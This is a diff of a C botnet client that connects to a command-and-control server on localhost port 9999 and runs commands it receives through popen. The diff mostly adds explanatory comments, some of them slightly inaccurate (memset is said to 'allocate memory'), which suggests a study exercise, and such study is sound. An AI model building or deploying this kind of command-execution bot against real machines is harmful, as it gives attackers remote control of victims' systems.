@@ -1,37 +1,50 @@
+//Include necessary libraries//
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
+//errno.h defines integer variable errno in an event of an error to indicate what has went wrong//
 #include <errno.h>
-
+//Define miscellaneous constants and symbolic constants//
 #include <unistd.h>
+//Allows socket programming//
 #include <sys/socket.h>
+//Defines standard types and structures for network programming
 #include <netinet/in.h>
+//Defines standard structures for internet operations
 #include <arpa/inet.h>
 
 #define CC_SERVER "127.0.0.1"
 #define CC_PORT 9999
 #define MAX_BUF 1024
 
-#define PEXIT(str) {perror (str);exit(1);}
+//for error messages
+#define PEXIT(str) {perror (str); exit(1);}
+
 static char *bot_id = NULL;
 
-int
-bot_print (int s, char *str)
+//write function
+int bot_print (int s, char *str)
 {
+  //write (int filedescriptor,const void * buffer,size)
   return write (s, str, strlen(str));
 }
 
-int
-bot_read (int s, char *msg)
+//read function
+int bot_read (int s, char *msg)
 {
+  //memset (void *str, int c, size_t n)
+  //allocates memory of size_t and sets the * with character c
+  //str is pointer to a block of memory
   memset (msg, 0, MAX_BUF);
-  if (read (s, msg, MAX_BUF)  <= 0) PEXIT ("bot_read:");
+  //read returns size of text piped into a buffer
+  // if size is less than 0 then there is some error
+  if (read (s, msg, MAX_BUF)  <= 0)
+    PEXIT ("bot_read:");
 
   return 0;
 }
-
-int
-bot_run_cmd (int s, char *cmd)
+//function for running custom commands
+int bot_run_cmd (int s, char *cmd)
 {
   char  line[1024];
   FILE *f = popen (cmd,"r");
@@ -96,8 +109,8 @@ bot_connect_cc (char *ip, int port)
   return s;
 }
 
-int
-main (int argc, char* argv[])
+//this is where the [program starts]
+int main (int argc, char* argv[])
 {
   char  msg[MAX_BUF];
   int   cc_s;
